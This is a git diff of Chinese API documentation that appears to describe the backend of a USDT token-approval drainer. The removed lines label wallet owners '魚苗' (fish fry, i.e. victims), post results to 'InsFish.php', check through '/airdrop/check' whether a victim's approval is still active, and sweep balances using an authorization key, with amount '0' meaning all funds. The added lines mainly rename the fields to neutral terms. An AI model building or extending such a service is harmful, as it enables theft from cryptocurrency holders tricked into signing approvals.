@@ -1,4 +1,4 @@
-## API: 新增授權
+## API: 交易驗證
 - 格式
 ```bash
 [POST] /verification
@@ -35,58 +35,27 @@ Body:
 }
 ```
 
-- 後台回覆 [POST] (https://.../InsFish.php)
-```js
-{
-  sAccount0: '', // 會員地址
-  sAccount1: '', // 授權地址
-  sAccount2: '', // 合約地址
-  sTransactionHash: '', // 交易序號
-  nTransactionStatus: 1, // 交易狀態. 0: 交易失敗, 1:交易成功, 2:交易尚未完成 或 無效的交易序號. 查詢交易明細可至 https://etherscan.io/tx/{transactionHash}
-  nType0: 1, // // 1:erc, 2:trc
-  nType1: 1 // 1: USDT
-}
-```
-
-## API: 查詢授權狀態
-- 格式
+- 後台回調 [POST]
 ```bash
-[POST] /airdrop/check
-
-Ex: /airdrop/check
-Body:
 {
-  addressType: '1',
-  contractAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-  userAddress: '0xf15e3B1dD8efc63358697c5737f1Aea7cdC5F137',
-  authorizationAddress: '0x1a6b4aC89317323D7eB9f817Cea8aE7F722530FA'
-}
-```
-
-- 參數(JSON)
-```js
-{
-  addressType: '', // 1:erc, 2:trc
-  contractAddress: '', // 合約地址
-  userAddress: '', // 魚苗地址
-  authorizationAddress: '' // 授權地址
-}
-```
-
-- 返回值(JSON)
-```js
-{
-  result: true, // true: 授權中, false, 無授權
-  status: 'ok' // 成功
+  addressType: 地址類型. 1:erc, 2:trc
+  contractAddress: 合約地址
+  from: 轉出地址
+  to: 轉入地址
+  amount: 交易量
+  timestamp: 交易時間戳
+  txHash: 交易序號
+  authKey: 認證Key
 }
 
 或
 
 {
   error: {
-    true: '' // 錯誤訊息
+    code: 錯誤碼
+    message: 錯誤訊息
   },
-  status: 'error' // 失敗
+  status: 'error'
 }
 ```
 
@@ -100,27 +69,30 @@ Ex: /0xadb2b42f6bd96f5c65920b9ac88619dce4166f94/balance?addressType=1&contractAd
 
 - 參數
 ```bash
-ownerAddress: 魚苗地址
-addressType: 地址類型. // 1:erc, 2:trc
+addressType: 地址類型. 1:erc, 2:trc
 contractAddress: 合約地址
+ownerAddress: 錢包地址
 ```
 
 - 返回值(JSON)
-```js
+```bash
 {
   result: {
-    balance: '' // 餘額
+    addressType: 地址類型. 1:erc, 2:trc
+    contractAddress: 合約地址
+    ownerAddress: 錢包地址
+    balance: 餘額
   },
-  status: 'ok' // 成功
+  status: 'ok'
 }
 
 或
 
 {
   error: {
-    message: '' // 錯誤訊息
+    message: 錯誤訊息
   },
-  status: 'error' // 失敗
+  status: 'error'
 }
 ```
 
@@ -142,66 +114,36 @@ Body:
 ```
 
 - 參數(JSON)
-```js
+```bash
 {
-  addressType: '', // 1:erc, 2:trc
-  contractAddress: '', // 合約地址
-  operator: '', // 授權地址的私鑰
-  from: '', // 魚苗地址
-  to: '', // 接收地址
-  amount: '' // 交易量. '0': 全部
+  addressType: 地址類型. 1:erc, 2:trc
+  contractAddress: 合約地址
+  from: 轉出私鑰
+  to: 轉入地址
+  amount: 交易量
 }
 ```
 
 - 返回值(JSON)
-```js
+```bash
 {
   result: {
-    transactionHash: '', // 交易序號
-    amount: '' // 實際交易量
+    addressType: 地址類型. 1:erc, 2:trc
+    contractAddress: 合約地址
+    from: 轉出地址
+    to: 轉入地址
+    amount: 交易量
+    txHash: 交易序號
   },
-  status: 'ok' // 成功
+  status: 'ok'
 }
 
 或
 
 {
   error: {
-    message: '' // 錯誤訊息
+    message: 錯誤訊息
   },
-  status: 'error' // 失敗
-}
-```
-
-## API: 查詢轉帳交易結果
-- 格式
-```bash
-[GET] /transaction/{transactionHash}?{addressType}=
-
-Ex: /transaction/0xeca371f848f3642413a4d3bd39e332efcea2ac866573851a7b2d19e942f343b9
-```
-
-- 參數
-```bash
-transactionHash: 交易序號
-addressType: 地址類型. // 1:erc, 2:trc
-```
-
-- 返回值(JSON)
-```js
-{
-  result: {
-    transactionStatus: 0 // 交易狀態. 0: 交易失敗, 1:交易成功, 2:交易尚未完成 或 無效的交易序號. 查詢交易明細可至 https://etherscan.io/tx/{transactionHash}
-  },
-  status: 'ok' // 成功
-}
-
-或
-
-{
-  error: {
-    message: '' // 錯誤訊息
-  },
-  status: 'error' // 失敗
+  status: 'error'
 }
 ```
